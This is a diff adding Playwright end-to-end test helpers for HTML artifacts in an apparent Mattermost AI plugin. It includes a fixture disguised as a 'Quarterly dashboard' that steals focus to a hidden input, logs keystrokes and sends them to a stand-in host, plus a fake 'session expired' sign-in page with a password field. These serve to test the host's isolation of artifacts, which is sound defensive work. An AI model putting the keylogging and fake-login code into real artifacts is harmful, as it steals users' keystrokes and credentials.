@@ -4,7 +4,10 @@
 // Helpers for the HTML artifacts e2e spec: feature-flag toggling, a
 // deterministic self-contained artifact document, and theme preferences.
 
-import type {FrameLocator, Locator, Page} from '@playwright/test';
+import * as http from 'http';
+import type {AddressInfo} from 'net';
+
+import {expect, type FrameLocator, type Locator, type Page} from '@playwright/test';
 
 import MattermostContainer from './mmcontainer';
 import {MATTERMOST_AI_PLUGIN_ID, pluginAdminConfigApiFromClient} from './plugin-http';
@@ -71,6 +74,136 @@ export function artifactIframes(scope: Page | Locator): Locator {
 
 export function artifactFrame(iframe: Locator): FrameLocator {
     return iframe.contentFrame();
+}
+
+/**
+ * Clicks the host's interact overlay of the (first) artifact frame in `scope`
+ * unless the viewer already engaged it. Until then the overlay takes every
+ * click, so clicks meant for controls inside the artifact must come after.
+ */
+export async function engageArtifact(scope: Locator): Promise<void> {
+    const frame = scope.getByTestId('html-artifact-frame').first();
+    if ((await frame.getAttribute('data-engaged')) !== 'true') {
+        await frame.getByTestId('html-artifact-interact').click();
+    }
+    await expect(frame).toHaveAttribute('data-engaged', 'true');
+}
+
+export const SECOND_VIEWER_USERNAME = 'seconduser';
+export const SECOND_VIEWER_PASSWORD = 'seconduser';
+
+/** Creates seconduser on the test team (same onboarding prefs as regularuser, threads inline). */
+export async function setupSecondViewer(mattermost: MattermostContainer): Promise<void> {
+    await mattermost.createUser('seconduser@sample.com', SECOND_VIEWER_USERNAME, SECOND_VIEWER_PASSWORD);
+    await mattermost.addUserToTeam(SECOND_VIEWER_USERNAME, 'test');
+    const client = await mattermost.getClient(SECOND_VIEWER_USERNAME, SECOND_VIEWER_PASSWORD);
+    const me = await client.getMe();
+    await client.savePreferences(me.id, [
+        {user_id: me.id, category: 'tutorial_step', name: me.id, value: '999'},
+        {user_id: me.id, category: 'onboarding_task_list', name: 'onboarding_task_list_show', value: 'false'},
+        {user_id: me.id, category: 'onboarding_task_list', name: 'onboarding_task_list_open', value: 'false'},
+        {user_id: me.id, category: 'drafts', name: 'drafts_tour_tip_showed', value: JSON.stringify({drafts_tour_tip_showed: true})},
+        {user_id: me.id, category: 'crt_thread_pane_step', name: me.id, value: '999'},
+        {user_id: me.id, category: 'display_settings', name: 'collapsed_reply_threads', value: 'off'},
+    ]);
+}
+
+export const FOCUS_THIEF_FILE_NAME = 'focus-thief.html';
+export const FOCUS_THIEF_EXFIL = 'https://exfil.example.invalid/keys';
+
+/**
+ * An artifact the viewer never clicks that keeps calling focus() on its own
+ * off-screen input from load, to catch keystrokes meant for the message box,
+ * and sends whatever it caught away by navigating its frame.
+ */
+export const FOCUS_THIEF_HTML = `<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Quarterly dashboard</title></head>
+<body>
+<h1>Quarterly dashboard</h1>
+<p>Revenue is up 12% quarter over quarter.</p>
+<input id="keys" aria-label="notes" autocomplete="off" style="position:absolute;left:-9999px">
+<script>
+  var keys = document.getElementById('keys');
+  setInterval(function () {
+    if (document.activeElement !== keys) {
+      keys.focus();
+    }
+  }, 300);
+  keys.addEventListener('input', function () {
+    if (keys.value.length >= 3) {
+      location.href = '${FOCUS_THIEF_EXFIL}?k=' + encodeURIComponent(keys.value);
+    }
+  });
+</script>
+</body>
+</html>
+`;
+
+export const HUNG_NAVIGATION_FILE_NAME = 'hung-navigation.html';
+export const HUNG_PAGE_TEXT = 'Your Mattermost session expired';
+
+/**
+ * An artifact that renders (the host shows it once the bridge is ready),
+ * then navigates its frame to `target`, a page that never finishes loading.
+ */
+export function hungNavigationHTML(target: string): string {
+    return `<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Report</title></head>
+<body>
+<h1>Loading report</h1>
+<script>
+  window.addEventListener('load', function () {
+    setTimeout(function () {
+      location.href = '${target}';
+    }, 1500);
+  });
+</script>
+</body>
+</html>
+`;
+}
+
+export type HungServer = {
+    url: string;
+
+    /** Resolves once the browser has requested the page. */
+    requested: Promise<void>;
+    close: () => Promise<void>;
+};
+
+/**
+ * Serves a fake sign-in page whose response sends headers and some HTML but
+ * never ends, so the frame showing it never fires a load event. Listens on
+ * the host the browser reaches Mattermost on (loopback for localhost), so
+ * the frame's navigation stays within the same address space.
+ */
+export async function startHungServer(mattermostURL: string): Promise<HungServer> {
+    const mmHost = new URL(mattermostURL).hostname;
+    const host = mmHost === 'localhost' ? '127.0.0.1' : mmHost;
+    let markRequested: () => void = () => undefined;
+    const requested = new Promise<void>((resolve) => {
+        markRequested = resolve;
+    });
+    const server = http.createServer((req, res) => {
+        markRequested();
+        res.writeHead(200, {'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store'});
+        res.write(`<!doctype html><html lang="en"><body><h1>${HUNG_PAGE_TEXT}</h1>` +
+            '<p>Sign in again to keep viewing this report.</p><input type="password" aria-label="Password">');
+        const keepAlive = setInterval(() => res.write(' '), 1000);
+        req.on('close', () => clearInterval(keepAlive));
+    });
+    await new Promise<void>((resolve) => server.listen(0, host, resolve));
+    const {port} = server.address() as AddressInfo;
+    return {
+        url: `http://${host}:${port}/session-expired`,
+        requested,
+        close: () => new Promise<void>((resolve) => {
+            server.closeAllConnections();
+            server.close(() => resolve());
+        }),
+    };
 }
 
 export const SPRINT_DASHBOARD_FILE_NAME = 'sprint-dashboard.html';
